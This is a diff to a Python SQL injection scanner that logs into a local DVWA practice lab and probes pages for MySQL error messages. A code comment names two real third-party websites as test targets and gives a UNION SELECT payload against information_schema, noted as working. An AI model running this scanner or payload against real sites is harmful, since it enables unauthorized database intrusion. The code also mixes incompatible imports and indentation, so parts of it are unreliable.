@@ -7,6 +7,9 @@ import sys
 from threading import Thread
 import getopt
 import re
+import urllib2
+import json
+import urllib.request
 from sys import argv
 from bs4 import BeautifulSoup
 
@@ -14,8 +17,9 @@ from bs4 import BeautifulSoup
 #Testing url: http://berkeleyrecycling.org/page.php?id=1
 #Testing url: http://www.romanianwriters.ro/s.php?id=1 : DAU ', )', 1' or 1=1 union select null, table_name from information_schema.tables# HOAT DONG
 
-_session = requests.session()
+session = requests.session()
 
+token = ""
 def introduce():
 	banner = """
 ====================================================================
@@ -30,24 +34,23 @@ def introduce():
 
 def loginDVWA():
     #  get user token
-    urlLogin = 'http://192.168.253.166/DVWA/login.php' 
-    r = _session.get(urlLogin)
-    parseHTML = BeautifulSoup(r.content,"lxml")
-    token = parseHTML.find("input",{"name":"user_token"})['value']
-
-    dataForm = {
-        'username':'admin',
-        'password':'password',
-        'Login':'Login',
-        'user_token':token
-    }
-    _session.post('http://192.168.253.166/DVWA/login.php', data=dataForm)
-    print colorama.Fore.GREEN + "[*] -> LOGIN SUCCESSFULLY" + colorama.Fore.RESET
-    r1 = _session.get('http://192.168.253.166/DVWA/security.php')
-    parseHTML = BeautifulSoup((r1.content),"lxml")
-    token = parseHTML.find ("input", {"name": "user_token"})['value']
-    print colorama.Fore.CYAN +"[!] -> Token value: " +token + colorama.Fore.RESET
-
+	urlLogin = 'http://192.168.253.167/DVWA/login.php' 
+	r = session.post(urlLogin)
+	parseHTML = BeautifulSoup(r.content,"lxml")
+	token = parseHTML.find("input",{"name":"user_token"})['value']
+	dataForm = {
+		'username':'admin',
+		'password':'password',
+		'Login':'Login',
+		'user_token':token
+ 	}
+	session.post('http://192.168.253.167/DVWA/login.php', data=dataForm)	
+	r1 = session.get('http://192.168.253.167/DVWA/index.php')
+ 	parseHTML = BeautifulSoup((r1.content),"lxml")
+	if "Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*" in r1.text:
+		print "Login Successfully!!"
+	else:
+		print "Login Failed!!"
 
 def usage():
 	print "Usage: "
@@ -79,8 +82,6 @@ def start(argv):
 		print "Failed Opening File:	"+dictio+"\n"
 		sys.exit()
 	launcher(url,name)
-	detect_columns(url)
-	detect_columns_names(url)
 
 def	launcher(url,dictio):
 	injected = []
@@ -91,13 +92,13 @@ def	launcher(url,dictio):
 	print "**********************************"
 	for	x in res:
 		print x.split(";")[0]
-	 
+
 def injector(injected):
 	errors = ['MySQL', 'error in your SQL']
 	results	= []
 	for	y in injected:
 		print "[-] Testing Errors: "+y
-		req = requests.get(y)
+		req = session.get(y)
 		for x in errors:
 			if req.content.find(x) != -1:
 				res = y	+ ";" + x
